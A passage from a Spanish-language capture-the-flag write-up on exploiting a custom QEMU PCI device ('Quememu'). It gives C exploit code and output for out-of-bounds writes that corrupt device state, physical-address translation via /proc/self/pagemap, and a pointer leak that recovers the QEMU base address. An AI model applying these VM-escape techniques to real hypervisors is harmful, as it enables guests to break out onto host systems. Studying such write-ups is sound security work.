+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------  
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # /exploit
+[*] buff    ==&gt; 0
+[*] base    ==&gt; 16
+[*] off     ==&gt; 0x0
+[*] src     ==&gt; 0
+[*] default ==&gt; 0xfabada
+</code></pre></div><p>Como se puede ver, tenemos datos que provienen claramente del dispositivo, como <code>0xfabada</code>, que es algo que no hemos escrito de manera explícita en <code>mmio_mem</code>. Esto ocurre porque hemos ejecutado la función de lectura con un <code>val</code> que no está gestionado, y por eso muestra <code>0xfabada</code> por defecto.</p><p>Genial, ahora tenemos que mapear el atributo <code>buff</code>. Para esto, es necesaria una función que encuentre la dirección de memoria física a la que se mapea una dirección de memoria virtual (tomada de <a href="https://github.com/nobodyisnobody/write-ups/tree/main/Hitcon.Quals.2023/pwn/Full.Chain.-.Wall.Maria">nobodyisnobody</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> </span><span class="mtk8">gva2gpa</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">addr</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> page </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/proc/self/pagemap"</span><span class="mtk1">, O_RDONLY);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fd </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"[!] open error in gva2gpa</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">lseek</span><span class="mtk1">(fd, ((</span><span class="mtk7 mtki">uint64_t</span><span class="mtk1">) addr </span><span class="mtk5">/</span><span class="mtk1"> PAGE_SIZE) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, SEEK_SET);</span>
+<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(fd, </span><span class="mtk5">&amp;</span><span class="mtk1">page, </span><span class="mtk6">8</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> ((page </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">7fffffffffffff</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> PAGE_SIZE) </span><span class="mtk5">|</span><span class="mtk1"> ((</span><span class="mtk7 mtki">uint64_t</span><span class="mtk1">) addr </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">fff</span><span class="mtk1">);</span>  
+<span class="mtk1">}</span>
+</code></pre></div><p>Y ahora, tenemos que mapear una página y buscar que las direcciones físicas y virtuales coincidan también con las páginas adyacentes. Esto se puede adaptar del <em>exploit</em> de <a href="https://github.com/nobodyisnobody/write-ups/tree/main/Hitcon.Quals.2023/pwn/Full.Chain.-.Wall.Maria">nobodyisnobody</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"sysctl vm.nr_hugepages=32"</span><span class="mtk1">);</span><span class="mtk3">  // Set huge page</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">buff;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> buff_gpa;</span>
+
+<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    buff </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">mmap</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> PAGE_SIZE, PROT_READ </span><span class="mtk5">|</span><span class="mtk1"> PROT_WRITE, MAP_SHARED </span><span class="mtk5">|</span><span class="mtk1"> MAP_ANONYMOUS </span><span class="mtk5">|</span><span class="mtk1"> MAP_NONBLOCK, </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>  
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (buff </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"[!] cannot mmap buff</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(buff, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> PAGE_SIZE);</span>
+<span class="mtk1">    buff_gpa </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">gva2gpa</span><span class="mtk1">(buff);</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (buff_gpa </span><span class="mtk5">+</span><span class="mtk1"> PAGE_SIZE </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk8">gva2gpa</span><span class="mtk1">(buff </span><span class="mtk5">+</span><span class="mtk1"> PAGE_SIZE)) {</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] buff virtual address  = </span><span class="mtk6">%p\n</span><span class="mtk4">"</span><span class="mtk1">, buff);</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] buff physical address = </span><span class="mtk6">%p\n\n</span><span class="mtk4">"</span><span class="mtk1">, (</span><span class="mtk7 mtki">void</span><span class="mtk5">*</span><span class="mtk1">) buff_gpa);</span>
+</code></pre></div><p>En este punto, ya podemos configurar el dispositivo PCI para empezar a explotarlo. Recordemos que usamos base <code>20</code> y el <em>offset</em> máximo para conseguir una escritura OOB de un byte:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk8">set_src</span><span class="mtk1">(buff_gpa);</span>
+<span class="mtk1">  </span><span class="mtk8">set_base</span><span class="mtk1">(</span><span class="mtk6">20</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">set_off</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">7fff</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] base ==&gt; </span><span class="mtk6">%d</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_base</span><span class="mtk1">());</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] off  ==&gt; 0x</span><span class="mtk6">%hx</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_off</span><span class="mtk1">());</span>  
+</code></pre></div><p>Y vemos que los parámetros están bien puestos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ___             __  __
+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------  
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # /exploit
+vm.nr_hugepages = 32
+[*] buff virtual address  = 0x7f9a069c9000
+[*] buff physical address = 0xb3e6000
+
+[*] base ==> 20
+[*] off  ==> 0x7fff
+</code></pre></div><p>Ahora, procedemos a cambiar <code>base</code> de manera &ldquo;artificial&rdquo;, sin usar las funciones del dispositivo PCI:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk3">// modify base with OOB write</span>
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(buff, </span><span class="mtk6">0</span><span class="mtk1">, MAX_RW);</span>
+<span class="mtk1">  buff[MAX_RW </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">21</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">set_buff</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] base ==&gt; </span><span class="mtk6">%d</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_base</span><span class="mtk1">());</span>  
+</code></pre></div><p>Si ejecutamos el <em>exploit</em> de nuevo, vemos que el atributo <code>base</code> cambia como esperábamos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ___             __  __
+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------  
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # /exploit
+vm.nr_hugepages = 32
+[*] buff virtual address  = 0x7fde2d468000
+[*] buff physical address = 0x3ffd8000
+
+[*] base ==> 20
+[*] off  ==> 0x7fff
+
+[+] base ==> 21
+</code></pre></div><p>Perfecto, lo siguiente es usar un <em>offset</em> de <code>0x6f6a</code>, lo cual nos dará un OOB de 3 bytes para modificar el atributo <code>off</code> de manera &ldquo;artificial&rdquo;. En verdad, después de realizar pruebas, descubrí que el valor adecuado era <code>0x6f6b</code>, que nos da un OOB de 4 bytes, que es lo necesario en este caso:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk3">// modify off with OOB write</span>
+<span class="mtk1">  </span><span class="mtk8">set_off</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">6f6b</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[*] off  ==&gt; 0x</span><span class="mtk6">%hx</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_off</span><span class="mtk1">());</span>  
+
+<span class="mtk1">  buff[MAX_RW </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>
+<span class="mtk1">  buff[MAX_RW </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  buff[MAX_RW </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">00</span><span class="mtk1">;</span>
+<span class="mtk1">  buff[MAX_RW </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">fe</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">set_buff</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] base ==&gt; </span><span class="mtk6">%d</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_base</span><span class="mtk1">());</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] off  ==&gt; 0x</span><span class="mtk6">%hx</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk8">get_off</span><span class="mtk1">());</span>
+</code></pre></div><p>Y como se puede ver, ya tenemos un valor negativo en <code>off</code> (en concreto, <code>-0x100</code>, que es más que suficiente para acceder a <code>mmio</code>). Por otro lado, hemos aprovechado y hemos puesto base <code>16</code> otra vez:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ___             __  __
+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------  
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # /exploit
+vm.nr_hugepages = 32
+[*] buff virtual address  = 0x7f9f8de69000
+[*] buff physical address = 0x327e5000
+
+[*] base ==> 20
+[*] off  ==> 0x7fff
+
+[+] base ==> 21
+
+[*] off  ==> 0x6f6b
+
+[+] base ==> 16
+[+] off  ==> 0xfe00
+</code></pre></div><h3 id="fugando-direcciones-de-memoria">Fugando direcciones de memoria</h3><p>Lo siguiente que podemos hacer es utilizar la lectura OOB para acceder al atributo <code>mmio</code> (estructura <code>MemoryRegion</code>). Para esto, le decimos al dispositivo que lea de su región de memoria física y nos ponga el resultado en nuestro <em>buffer</em> virtual. Después, lo que hacemos es interpretar los datos como tipo <code>uint64_t</code> e imprimimos varios valores:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk8">get_buff</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">uint64_t</span><span class="mtk5">*</span><span class="mtk1"> data </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">uint64_t</span><span class="mtk5">*</span><span class="mtk1">) buff;</span>  
+
+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">80</span><span class="mtk1">; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">: </span><span class="mtk6">%lx\n</span><span class="mtk4">"</span><span class="mtk1">, i, data[i]);</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Este es el resultado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ___             __  __
+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------  
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # /exploit
+vm.nr_hugepages = 32
+[*] buff virtual address  = 0x7f50e1ae5000
+[*] buff physical address = 0xb9e8000
+
+[*] base ==> 20
+[*] off  ==> 0x7fff
+
+[+] base ==> 21
+
+[*] off  ==> 0x6f6b
+
+[+] base ==> 16
+[+] off  ==> 0xfe00
+
+0: 0
+1: 0
+2: 0
+3: 0
+4: 0
+5: 0
+6: 0
+7: 0
+8: 0
+9: 0
+10: 0
+11: 0
+12: 0
+13: 0
+14: 0
+15: 0
+16: 0
+17: 0
+18: 0
+19: 0
+20: 0
+21: 0
+22: 1
+23: 0
+24: 0
+25: 0
+26: 0
+27: 0
+28: 0
+29: 0
+30: 55a2dae78d90
+31: 0
+32: 55a2dbd16f60
+33: 1
+34: 55a2dbda4a70
+35: 1
+36: 0
+37: 0
+38: 55a2dbda4a70
+39: 55a2dbda4a70
+40: 55a2d9a79460
+41: 55a2dbda4a70
+42: 55a2dae4aae0
+43: 0
+44: 10000
+45: 0
+46: febb0000
+47: 55a2d8c7f320
+48: 0
+49: 10001
+50: 0
+51: 0
+52: 1
+53: 0
+54: 55a2dbda5558
+55: 55a2dbd745e0
+56: 55a2dae4ab98
+57: 0
+58: 55a2dbda5578
+59: 55a2dbd696a0
+60: 0
+61: 0
+62: 0
+63: 0
+64: 0
+65: 0
+66: 0
+67: 0
+68: 0
+69: 0
+70: 0
+71: 0
+72: 0
+73: 0
+74: 0
+75: 0
+76: 0
+77: 0
+78: 0
+79: 0
+</code></pre></div><p>Vemos unos cuantos punteros ahí. Para identificar cuál es cuál, podemos ver la estructura <a href="https://github.com/qemu/qemu/blob/master/include/exec/memory.h#L785"><code>MemoryRegion</code></a>. Otra opción es tratar de buscar el puntero a <code>mmio->ops</code>. Para esto, podemos usar <code>readelf</code> sobre el binario de <code>qemu</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">qemu-system-x86_64</span> | <span class="code-dark-green">grep</span> quememu
+ 10415: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS <span class="code-red">quememu</span>.c
+ 10416: 00000000004282b0    16 FUNC    LOCAL  DEFAULT   16 pci_<span class="code-red">quememu</span>_regi[...]  
+ 10417: 00000000014f73e0   104 OBJECT  LOCAL  DEFAULT   24 <span class="code-red">quememu</span>_info.4
+ 10419: 0000000000428360   118 FUNC    LOCAL  DEFAULT   16 <span class="code-red">quememu</span>_mmio_write
+ 10420: 00000000004283e0   125 FUNC    LOCAL  DEFAULT   16 <span class="code-red">quememu</span>_mmio_read
+ 10421: 0000000000428460   108 FUNC    LOCAL  DEFAULT   16 pci_<span class="code-red">quememu</span>_realize
+ 10423: 00000000014f7460    80 OBJECT  LOCAL  DEFAULT   24 <span class="code-red">quememu</span>_mmio_ops
+ 10424: 00000000004284d0   152 FUNC    LOCAL  DEFAULT   16 <span class="code-red">quememu</span>_class_init
+ 10427: 0000000000428570    73 FUNC    LOCAL  DEFAULT   16 <span class="code-red">quememu</span>_instance_init
+
+<span class="code-red">#</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">qemu-system-x86_64</span> | <span class="code-dark-green">grep</span> quememu_mmio_ops
+ 10423: 00000000014f7460    80 OBJECT  LOCAL  DEFAULT   24 <span class="code-red">quememu_mmio_ops</span>
+</code></pre></div><p>Ahí vemos que los tres últimos dígitos hexadecimales son <code>460</code>, y coinciden con la posición <code>40</code> de la lista de arriba. Entonces, tenemos el <em>offset</em> y el índice en el <em>array</em>. Con esto podemos calcular la dirección base de <code>qemu</code> (que tiene PIE).</p><p>Otro índice importante es el de <code>parent_obj</code>, que es el <code>30</code>. Con este índice tenemos la relación entre nuestro <em>buffer</em> y el del
+dispositivo PCI (en otras palabras, su índice <code>0</code> es nuestro índice <code>30</code>).</p><p>También sería bueno tener la dirección en la que se encuentra el <em>buffer</em> en <code>qemu</code>. Para eso, podemos poner una instrucción <code>getchar</code> en el código y luego agregar GDB al proceso. Pero antes, vamos a poner los datos que ya tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">QUEMEMU_MMIO_OPS_OFFSET</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">14f7460</span>  
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">QUEMEMU_MMIO_OPS_INDEX</span><span class="mtk1"> </span><span class="mtk6">40</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">QUEMEMU_MMIO_OPAQUE_INDEX</span><span class="mtk1"> </span><span class="mtk6">41</span>
+<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">QUEMEMU_MMIO_PARENT_OBJ_INDEX</span><span class="mtk1"> </span><span class="mtk6">30</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> qemu_base_addr </span><span class="mtk5">=</span><span class="mtk1"> data[QUEMEMU_MMIO_OPS_INDEX] </span><span class="mtk5">-</span><span class="mtk1"> QUEMEMU_MMIO_OPS_OFFSET;</span>  
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] qemu base address: 0x</span><span class="mtk6">%lx\n</span><span class="mtk4">"</span><span class="mtk1">, qemu_base_addr);</span>
+
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ___             __  __
+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------  
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # /exploit
+vm.nr_hugepages = 32
+[*] buff virtual address  = 0x7f30a81bb000
+[*] buff physical address = 0x2abf3000
+
+[*] base ==> 20
+[*] off  ==> 0x7fff
+
+[+] base ==> 21
+
+[*] off  ==> 0x6f6b
+
+[+] base ==> 16
+[+] off  ==> 0xfe00
+
+0: 0
+...
+29: 0
+30: 5614b174cd90
+31: 0
+32: 5614b25eaf60
+33: 1
+34: 5614b2678a70
+35: 1
+36: 0
+37: 0
+38: 5614b2678a70
+39: 5614b2678a70
+40: 5614b0eaf460
+41: 5614b2678a70
+42: 5614b171eae0
+43: 0
+44: 10000
+45: 0
+46: febb0000
+47: 5614b00b5320
+48: 0
+49: 10001
+50: 0
+51: 0
+52: 1
+53: 0
+54: 5614b2679558
+55: 5614b26485e0
+56: 5614b171eb98
+57: 0
+58: 5614b2679578
+59: 5614b263d6a0
+60: 0
+...
+79: 0
+[+] qemu base address: 0x5614af9b8000
+</code></pre></div><p>Lo primero que podemos comprobar es si la dirección base de <code>qemu</code> es correcta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">gdb</span> -q -p <span class="code-dark-magenta">$(</span><span class="code-dark-green">pidof</span> <span class="mtku">qemu-system-x86_64</span><span class="code-dark-magenta">)</span> <span class="mtku">qemu-system-x86_64</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>vmmap qemu
+[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span>ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
+<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
+<span>0x00005614af9b8000</span> <span>0x00005614afcd1000</span> <span>0x0000000000319000</span> <span>0x0000000000000000</span> <span>r--</span> <span>/root/HackOn/Quememu/qemu-system-x86_64</span>  
+<span class="code-dark-red">0x00005614afcd1000</span> <span class="code-dark-red">0x00005614b0342000</span> <span class="code-dark-red">0x0000000000671000</span> <span class="code-dark-red">0x0000000000319000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/root/HackOn/Quememu/qemu-system-x86_64</span>
+<span>0x00005614b0342000</span> <span>0x00005614b0692000</span> <span>0x0000000000350000</span> <span>0x000000000098a000</span> <span>r--</span> <span>/root/HackOn/Quememu/qemu-system-x86_64</span>
+<span>0x00005614b0692000</span> <span>0x00005614b1069000</span> <span>0x00000000009d7000</span> <span>0x0000000000cd9000</span> <span>r--</span> <span>/root/HackOn/Quememu/qemu-system-x86_64</span>
+<span class="code-dark-green">0x00005614b1069000</span> <span class="code-dark-green">0x00005614b117f000</span> <span class="code-dark-green">0x0000000000116000</span> <span class="code-dark-green">0x00000000016b0000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">/root/HackOn/Quememu/qemu-system-x86_64</span>
+</code></pre></div><p>Ahora, podemos buscar por referencias a la dirección de <code>mmio->ops</code> para encontrar la estructura <code>mmio</code> del dispositivo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>find 0x5614b0eaf460
+<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">\x60\xf4\xea\xb0\x14\x56</span>' in whole memory
+<span class="code-green">[+]</span> In '<span class="code-dark-blue">[heap]</span>' (0x5614b1607000-0x5614b28ab000 [rw-])
+  0x5614b26794f0:    <span>60</span> <span class="code-dark-yellow">f4</span> <span class="code-dark-yellow">ea</span> <span class="code-dark-yellow">b0</span> <span class="code-dark-yellow">14</span> <span>56</span> <span class="code-grey">00</span> <span class="code-grey">00</span>  <span>70</span> <span class="code-dark-yellow">8a</span> <span>67</span> <span class="code-dark-yellow">b2</span> <span class="code-dark-yellow">14</span> <span>56</span> <span class="code-grey">00</span> <span class="code-grey">00</span>    |  `....V..p.g..V..  |  
+<span class="code-green">[+]</span> In (0x7f45c1e00000-0x7f4601e00000 [rw-])
+  0x7f45ec9f3140:    <span>60</span> <span class="code-dark-yellow">f4</span> <span class="code-dark-yellow">ea</span> <span class="code-dark-yellow">b0</span> <span class="code-dark-yellow">14</span> <span>56</span> <span class="code-grey">00</span> <span class="code-grey">00</span>  <span>70</span> <span class="code-dark-yellow">8a</span> <span>67</span> <span class="code-dark-yellow">b2</span> <span class="code-dark-yellow">14</span> <span>56</span> <span class="code-grey">00</span> <span class="code-grey">00</span>    |  `....V..p.g..V..  |
+</code></pre></div><p>Ahora, ya sabemos más o menos dónde está la estructura:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/30gx 0x5614b26794f0
+<span class="code-dark-blue">0x5614b26794f0</span>: 0x00005614b0eaf460      0x00005614b2678a70  
+<span class="code-dark-blue">0x5614b2679500</span>: 0x00005614b171eae0      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679510</span>: 0x0000000000010000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679520</span>: 0x00000000febb0000      0x00005614b00b5320
+<span class="code-dark-blue">0x5614b2679530</span>: 0x0000000000000000      0x0000000000010001
+<span class="code-dark-blue">0x5614b2679540</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679550</span>: 0x0000000000000001      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679560</span>: 0x00005614b2679558      0x00005614b26485e0
+<span class="code-dark-blue">0x5614b2679570</span>: 0x00005614b171eb98      0x0000000000000000
